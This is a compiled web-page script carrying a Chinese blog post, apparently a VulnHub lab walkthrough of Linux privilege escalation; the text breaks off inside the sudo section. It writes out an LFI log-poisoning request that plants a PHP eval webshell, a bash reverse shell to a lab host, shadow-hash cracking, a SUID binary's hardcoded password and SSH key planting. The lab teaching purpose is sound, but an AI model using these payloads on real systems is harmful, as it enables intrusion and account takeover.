(window.webpackJsonp=window.webpackJsonp||[]).push([[96],{420:function(s,a,t){"use strict";t.r(a);var n=t(3),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"从challenge42看linux提权基本技巧"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#从challenge42看linux提权基本技巧"}},[s._v("#")]),s._v(" 从Challenge42看Linux提权基本技巧")]),s._v(" "),a("blockquote",[a("p",[s._v("本文首发于跳跳糖社区 https://tttang.com/archive/1414/")])]),s._v(" "),a("h2",{attrs:{id:"_0x00-前言"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x00-前言"}},[s._v("#")]),s._v(" 0x00 前言")]),s._v(" "),a("p",[s._v("最近在学习Linux提权的时候，找到了一个很不错的靶机，基本可以覆盖基础Linux提权的技巧，因此做一个记录")]),s._v(" "),a("p",[s._v("靶机下载地址：https://www.vulnhub.com/entry/42challenge-1,465/")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_1db751f6e27240dd947c50100e5831ad.png",alt:""}})]),s._v(" "),a("p",[s._v("在本例中的靶机地址： 192.168.111.16")]),s._v(" "),a("h2",{attrs:{id:"_0x01-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-getshell"}},[s._v("#")]),s._v(" 0x01 GetShell")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_a7eb97ccc1c325de10847b517393ec9e.png",alt:""}})]),s._v(" "),a("p",[s._v("存在lfi漏洞\n"),a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_2e8e9e2dcb55699016f34d6c891e8e09.png",alt:""}})]),s._v(" "),a("p",[s._v("这里利用/var/log/nginx/access.log去包含可控的User-Agent头")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("GET /index.php?log=/var/log/nginx/access.log HTTP/1.1\nHost: 192.168.111.28\nPragma: no-cache\nCache-Control: no-cache\nDNT: 1\nUpgrade-Insecure-Requests: 1\nUser-Agent: <?php eval($_REQUEST['eki']);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("因为access.log会一直叠加，所以我们直接在webroot重写一个马")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('POST /index.php?log=/var/log/nginx/access.log HTTP/1.1\nHost: 192.168.111.16\nPragma: no-cache\nCache-Control: no-cache\nDNT: 1\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\neki=file_put_contents("eki.php","<?php+eval(\\$_REQUEST[\'eki\']);?>")%3b\n\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("此时可以用蚁剑连接")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_50d05637f19ac96000f619bc8da1b41d.png",alt:""}})]),s._v(" "),a("p",[s._v("拿到第一个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_8b870ef075288da3afa407c6f82a71c7.png",alt:""}})]),s._v(" "),a("p",[s._v("既然要体验多种提权方法，肯定不能通过内核提权漏洞一把梭了")]),s._v(" "),a("h2",{attrs:{id:"_0x02-反弹shell-密码文件爆破"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-反弹shell-密码文件爆破"}},[s._v("#")]),s._v(" 0x02 反弹shell-密码文件爆破")]),s._v(" "),a("p",[s._v("目前我们手里只有webshell\n可以利用反弹shell来得到一个完整的shell环境方便执行一些命令")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 开启本地12336端口监听")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-lvvp")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("12336")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("bash -c 'exec bash -i &>/dev/tcp/192.168.111.1/12336 0>&1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_06b9427915fc773fbf4f8f79958dcdca.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_0139d1bb45b18bd286edb8b1d8d403f4.png",alt:""}})]),s._v(" "),a("p",[s._v("查找敏感文件，这里找密码相关的文件")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("find / -iname '*passwd*' 2>/dev/null\nfind / -iname '*shadow*' 2>/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_9f0125b227ee4e5bc3615cda06c8886c.png",alt:""}})]),s._v(" "),a("p",[s._v("找到几个有趣的")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("cat /var/backups/shadow_backup.bak\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("可以拿到下面这些hash")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("root:$6$nGvBJ7Ph$jqHgNPRgfT4/lLkPMXMB0WnD9bmrTXMhjXm2OYmlKTU3G/nn5MVZ93Xi4EwX9TwP.zFwM/CUJ11wxC/whIOdF/:18319:0:99999:7:::\nlucas:$6$zBETbEhW$rF/A44Y5NCJATkFfD4Qu4lzebQ/PW5/kPD1WKTzf6/uSt4PtPXESIENWW5xd9PsKGu7k2hCLI9uz7s8HyNHdv.:18318:0:99999:7:::\nmaria:$6$jD/TgaEw$6HAWM6i4NUsMtSUkqx1d60cdQTLJTWIN/9Y5Qmr0pShdkhiZ/M465WwFDUj4HKnuKZuHc53GPNJg01uY/9DPQ0:18318:0:99999:7:::\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("尝试hash爆破下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("john -w=rockyou.txt shadow.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_c903db6752319f5b0a88f6c2a45334a1.png",alt:""}})]),s._v(" "),a("p",[s._v("解得一个密码")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("marvin marvinthemartian\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("拿到第二个flag\n"),a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_5d571ab3e00b29dfc326f23b14d7397f.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_0x03-利用存在的suid权限程序提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-利用存在的suid权限程序提权"}},[s._v("#")]),s._v(" 0x03 利用存在的SUID权限程序提权")]),s._v(" "),a("h3",{attrs:{id:"什么是suid"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是suid"}},[s._v("#")]),s._v(" 什么是SUID？")]),s._v(" "),a("p",[s._v("我们知道使用 ls -l 命令可以查看文件的具体属性：")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_795c5570ef62017610501936c8da7f49.png",alt:""}})]),s._v(" "),a("p",[s._v("如图所示，第一列所示告诉了用户一个文件的类型和权限信息：")]),s._v(" "),a("ul",[a("li",[s._v('第一个字符 "d"，表明该文件是一个目录文件；')]),s._v(" "),a("li",[a("code",[s._v("rwx")]),s._v(" 表示该文件具有可读/写/可执行权限；")]),s._v(" "),a("li",[s._v("三组 "),a("code",[s._v("rwx")]),s._v(" 分别表示该文件所有者/文件所在组/其他用户对该文件的权限。")])]),s._v(" "),a("p",[s._v("而在cat这个文件中我们看到他拥有的权限是"),a("code",[s._v("rws")])]),s._v(" "),a("p",[a("code",[s._v("s")]),s._v("就代表着uid权限,出现在文件所有者的"),a("code",[s._v("x")]),s._v("权限上，其作用是让执行该文件的用户在使用这个文件时具有该文件所有者的权限：")]),s._v(" "),a("p",[s._v("1）SUID 权限仅对二进制可执行文件有效，不能用于目录文件，脚本也不行；")]),s._v(" "),a("p",[s._v("2）执行者对于该文件需要由可执行权限；")]),s._v(" "),a("p",[s._v("3）本权限仅在执行该文件的过程中有效，即在文件被执行时文件使用者才具备该文件所有者的权限，执行完毕后不再拥有文件所有者的权限；")]),s._v(" "),a("p",[s._v("比如以上述cat程序为例（是从/usr/bin中拷贝而来设置了suid）")]),s._v(" "),a("p",[s._v("分别运行没有suid位的cat和当前目录有suid的cat，可以看到没有suid的cat运行时权限是用户权限所以无权读取/etc/shadow,运行有suid的cat就可以获得对应所属者的root权限读取到/etc/shadow")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_800a03b7dfa2f836f686241c135044c8.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("Tips：\nsuid实际上可以理解为对原有rwx的扩展，也有三种：\nSUID SGID SBIT\nSGID与 SUID 一样，其作用是让执行该文件的用户在使用该文件时具有该文件所属组的权限。出现在文件所在组的 x 权限上。\nSBIT 的标志为 t，出现在文件其他用户的 x 权限上，只能用于目录。其作用是，该目录下的文件只有文件的创建者自己和 root 用户才可以执行删除或修改操作。\n　　与 r、w、x 一样，这三个标志位也可以用数字来标识:\n　　SUID:4 SGID:2 SBIT:1 放在基础权限位之前\n　"),a("code",[s._v("chmod 4755 newfile # 为文件设置 rwsr-xr-x 权限 chmod 2755 newfile # 为文件设置 rwxr-sr-x 权限 chmod 7755 newdirectory 　　 # 为目录设置 rwsr-sr-t 权限")])])]),s._v(" "),a("h3",{attrs:{id:"提权过程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#提权过程"}},[s._v("#")]),s._v(" 提权过程")]),s._v(" "),a("p",[s._v("查找所有含suid的文件")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("find / -perm -u=s -type f 2>/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_aa13b5891c3ccb4197084b7db1a48559.png",alt:""}})]),s._v(" "),a("p",[s._v("这个Lucas_Access比较特殊")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_e22bd2cc325dbc89d8f5154e33a438c3.png",alt:""}})]),s._v(" "),a("p",[s._v("而且任意用户都有权限执行和读取，运行后需要输入密码")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_1059d8315620c686d59accd1f42c3eb8.png",alt:""}})]),s._v(" "),a("p",[s._v("我们可以把它下载下来逆向分析，大概就是输入密码判定然后开启shell,其中密码逻辑反汇编如下")]),s._v(" "),a("div",{staticClass:"language-cpp line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[s._v("__int64 __fastcall "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("try")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("__int64 a1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// [rsp+14h] [rbp-Ch]")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// [rsp+18h] [rbp-8h]")]),s._v("\n\n  v3 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("malloc")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x11uLL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("strcpy")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"3dF_s6Pc"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("strcat")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"j$mrE_Zz"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_BYTE "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" a1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("_BYTE "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" a1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("++")]),s._v("i "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("unsigned")]),s._v(" __int8 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" a1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("unsigned")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("unsigned")]),s._v(" __int8"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("v3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("i"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[s._v("可以推出密码为=>"),a("code",[s._v("3dF_s6Pcj$mrE_Zz")])]),s._v(" "),a("p",[s._v("输入密码后进入第三个用户的shell环境，不过此时的Home环境还是marvin的")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_864d8ef92cb3ff33be0ee914a139f02a.png",alt:""}})]),s._v(" "),a("p",[s._v("我们可以把本地公钥写到lucas的"),a("code",[s._v("./ssh/authorized_keys")]),s._v("里方便直接登录")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('mkdir -p /home/lucas/.ssh/ &&echo "<your public_keys>" >> /home/lucas/.ssh/authorized_keys\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("拿到第三个flag")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://pics-1300769201.cos.ap-nanjing.myqcloud.com/img/upload_b2af61880180c706d847b93125b2c4a1.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_0x04-不安全的sudo配置导致的提权"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-不安全的sudo配置导致的提权"}},[s._v("#")]),s._v(" 0x04 不安全的sudo配置导致的提权")]),s._v(" "),a("h3",{attrs:{id:"什么是sudo"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#什么是sudo"}},[s._v("#")]),s._v(" 什么是sudo?")]),s._v(" "),a("p",[s._v("sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。")]),s._v(" "),a("p",[s._v("它的特性主要有这样几点：")]),s._v(" "),a("ul",[a("li",[s._v("sudo能够限制用户只在某台主机上运行某些命令。")]),s._v(" "),a("li",[s._v("sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。")]),s._v(" "),a("li",[s._v("sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。")]),s._v(" "),a("li",[s._v("sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。也可以引用其他配置目录，一般存放在/etc/sudoers.d目录下，一个用户对应着一个文件")])]),s._v(" "),a("p",[a("strong",[s._v("参数说明")]),s._v("：")]),s._v(" "),a("ul",[a("li",[s._v("-V 显示版本编号")]),s._v(" "),a("li",[s._v("-h 会显示版本编号及指令的使用方式说明")]),s._v(" "),a("li",[s._v("-l 显示出自己（执行 sudo 的使用者）的权限")]),s._v(" "),a("li",[s._v("-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码")]),s._v(" "),a("li",[s._v("-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）")]),s._v(" "),a("li",[s._v("-b 将要执行的指令放在背景执行")]),s._v(" "),a("li",[s._v("-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称")]),s._v(" "),a("li",[s._v("-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）")]),s._v(" "),a("li",[s._v("-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell")]),s._v(" "),a("li",[s._v("-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）")]),s._v(" "),a("li",[s._v("command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令")])]),s._v(" "),a("h3",{attrs:{id:"sudoer配置文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sudoer配置文件"}},[s._v("#")]),s._v(" Sudoer配置文件")]),s._v(" "),a("p",[s._v("一个示例的配置文件如下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('#\n# This file MUST be edited with the \'visudo\' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Members of the admin group may gain root privileges\n%admin ALL=(ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\n\n# See sudoers(5) for more information on "#include" directives:\n\n#includedir /etc/sudoers.d\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass: